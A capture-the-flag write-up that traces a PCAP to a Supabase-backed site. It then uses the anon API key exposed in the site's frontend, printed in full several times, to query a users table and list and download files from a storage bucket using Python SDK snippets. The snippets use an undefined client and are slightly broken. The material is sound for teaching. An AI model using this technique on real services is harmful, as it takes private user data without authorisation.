## Introduction

Given a PCAP file, find the girl's phone number and her hair color.
If you are not familiar with PCAP files, It is a file that contains network traffic, and it can be opened using Wireshark.

![](images/image.png)

Although it is not a forensics challenge, in fact it is a web challenge, but I think a little of knowledge of how to use Wireshark is a great to have.

## Analysis

First, we need to open the PCAP file using Wireshark. It is a really simple one, only contains HTTP Requests to different websites. Some of them are familiar like Youtube, Twitter, Linkedin... And only one of them is not familiar, which is `https://0nly-friends.vercel.app/login`.

![](images/s1.png)

Going through the Application, we see a process of registeration and login, and once you have logged in you can see a file upload form that looks like it is static. 
Going through the enumeration, once we open the console, or opening the web page code we can see this comment:

![](images/s2.png)

Going back and testing authentication endpoints we can see such in the registeration endpoint:

![](images/s3.png)

the endpoint (`POST`, `?columns=...`, `/users`) gives an impression of SQL code, and since the note tells about a bad practice that the developer used, we can clearly see that there's an API key being send alongside the request, which doesn't look like a healthy practice clearly.

Saving the values for later:
- **endpoint**: `https://mmwaytrwcxmwbvzonihf.supabase.co/rest/v1/users`
- **apikey**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1td2F5dHJ3Y3htd2J2em9uaWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NzUyMDQwMjYsImV4cCI6MTk5MDc4MDAyNn0.J-ghVT7RRkZ1vsPnKSSdBDOfLBHtdkhfw5B_kquPXNo`

Assuming we know that endpoint and we have the API key, we can try to send a request to the endpoint tryin a `SELECT * FROM users` kind query, and we get the following response using postman:

![](images/s4.png)

what interests us is this part:
```json
    {
        "id": 7,
        "created_at": "2023-02-01T01:26:59+00:00",
        "phone": null,
        "email": "hey there, hacker",
        "name": "since you have reached this, how about you check the storage, try the documentation or something?"
    },
    {
        "id": 5,
        "created_at": "2023-02-01T00:25:15.335812+00:00",
        "phone": "koukou_girl_xe_got",
        "email": "8ae8eca9e20d09699af4bdec5cc987@gmail.com",
        "name": "koukou"
    },
```

We can see a flag-like value for one of the phone fields: `koukou_girl_xe_got`, we can assume that is it our first half of the flag, where it asks about the phone number of the girl.

And we see a note just above it, which says: `hey there, hacker, since you have reached this, how about you check the storage, try the documentation or something?`

Talking about storage, and seing a File form in the website, even though static, and looking at the endpoint itself, which resembles to `Supabase`, which is for who doesn't know, a `Firebase` alternative, or basically a backend as a service that provides a set of tools like a database, authentication, storage, etc.

Our next target based on what we have, will be to check what do we have in the storage account, since we already have the API key. the question is how?

Googling how to interact with Supabase, there's already a list of SDKs we can use [here](https://supabase.com/docs)

![](images/s5.png)

## Solving 

Heading for the [Python One](https://supabase.com/docs/reference/python/select), we see a list of functionalities we can use, like listing buckets, listing files, uploading files, downloading them, etc.

![](images/s6.png)

For who doesn't know, a bucket is a container for objects stored in a cloud service, so if there's a file we need to find, it will be located inside a bucket, and getting a file requires knowing which bucket it is located in. So our first step will be to list all the buckets, and then list all the files inside each bucket.

We can use the following code to do that (*after installing the SDK*):

```python

from supabase import create_client, Client

url = "https://mmwaytrwcxmwbvzonihf.supabase.co"
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1td2F5dHJ3Y3htd2J2em9uaWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NzUyMDQwMjYsImV4cCI6MTk5MDc4MDAyNn0.J-ghVT7RRkZ1vsPnKSSdBDOfLBHtdkhfw5B_kquPXNo"

def get_buckets():
    r = supabase.storage().list_buckets()
    print(r)

get_buckets()
```

It returns this output:
```
[SyncBucket(id='images', name='images', owner='', public=True, created_at=datetime.datetime(2023, 2, 1, 0, 35, 39, 997380, tzinfo=tzutc()), updated_at=datetime.datetime(2023, 2, 1, 0, 35, 39, 997380, tzinfo=tzutc()))]
```

Which is an array of a single bucket, which is `images`. So we can use the following code to list all the files inside the bucket:

```python
from supabase import create_client, Client

url = "https://mmwaytrwcxmwbvzonihf.supabase.co"
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1td2F5dHJ3Y3htd2J2em9uaWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NzUyMDQwMjYsImV4cCI6MTk5MDc4MDAyNn0.J-ghVT7RRkZ1vsPnKSSdBDOfLBHtdkhfw5B_kquPXNo"

def get_bucket_content(bucket_name):
    r = supabase.storage().from_(bucket_name).list()
    print(r)

get_bucket_content("images")
```

Which returns this output:
```
[{'name': '.emptyFolderPlaceholder', 'id': '6d473cec-1cc0-4493-b8dd-aba8cf5dffce', 'updated_at': '2023-02-01T02:07:15.420388+00:00', 'created_at': '2023-02-01T02:07:15.337901+00:00', 'last_accessed_at': '2023-02-01T02:07:15.337901+00:00', 'metadata': {'eTag': '"d41d8cd98f00b204e9800998ecf8427e"', 'size': 0, 'mimetype': 'application/octet-stream', 'cacheControl': 'max-age=3600', 'lastModified': '2023-02-01T02:07:16.000Z', 'contentLength': 0, 'httpStatusCode': 200}}, {'name': 'looking-for-me.png', 'id': 'f00dc580-7425-48d3-ab30-9a8568c6fdf5', 'updated_at': '2023-02-01T02:07:38.251022+00:00', 'created_at': '2023-02-01T02:07:21.972737+00:00', 'last_accessed_at': '2023-02-01T02:07:38.01+00:00', 'metadata': {'eTag': '"dcb0925bef8e66ea67bcb56e7e01d417"', 'size': 274318, 'mimetype': 'image/png', 'cacheControl': 'max-age=3600', 'lastModified': '2023-02-01T02:07:39.000Z', 'contentLength': 274318, 'httpStatusCode': 200}}]
```

Which is an array of a single large object, that his name - what we basically need - is `looking-for-me.png`, so we can use the following code to download the file and save it with the same name in the current directory:

```python
from supabase import create_client, Client

url = "https://mmwaytrwcxmwbvzonihf.supabase.co"
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1td2F5dHJ3Y3htd2J2em9uaWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NzUyMDQwMjYsImV4cCI6MTk5MDc4MDAyNn0.J-ghVT7RRkZ1vsPnKSSdBDOfLBHtdkhfw5B_kquPXNo"


def download_file(bucket_name, file_name):
    r = supabase.storage().from_(bucket_name).download(file_name)
    open(file_name, 'wb').write(r)

download_file("images", "looking-for-me.png")
```

And the code executes successfully, and we can see the file in the current directory.

![](images/s7.png)

## Conclusion

Plus having a general based skills like scripting, enumeration, using tools like Wireshark and reading documentation no matter your target was, is the key to success in every mission.


## Note

Although Supabase is restricted regarding using its API Keys, in this CTF I enabled public access to the database and the storage service just for the sake of the demo, with blocking all Mutation requests, the moral of the story API Keys don't belong to the frontend that's why backends matter.

## Flag
> `ENIT{koukou_girl_xe_got_r3d_Ha1R_N_dont_put_S3Krets_1n_fR0nt}`






